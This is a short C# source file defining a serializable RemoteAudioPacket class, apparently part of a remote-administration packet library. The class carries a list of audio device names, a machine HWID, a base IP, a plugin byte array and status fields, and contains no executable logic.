using System;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class RemoteAudioPacket : IPacket
    {
        public RemoteAudioPacket() : base()
        {
            this.packetType = PacketType.AUDIO_GET_DEVICES;
        }

        public RemoteAudioPacket(List<string> audioDevices, string baseIp, string HWID) : base()
        {
            this.packetType = PacketType.AUDIO_GET_DEVICES;
            this.baseIp = baseIp;
            this.HWID = HWID;

            this.audioDevices = audioDevices;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public List<string> audioDevices { get; set; }
    }
}
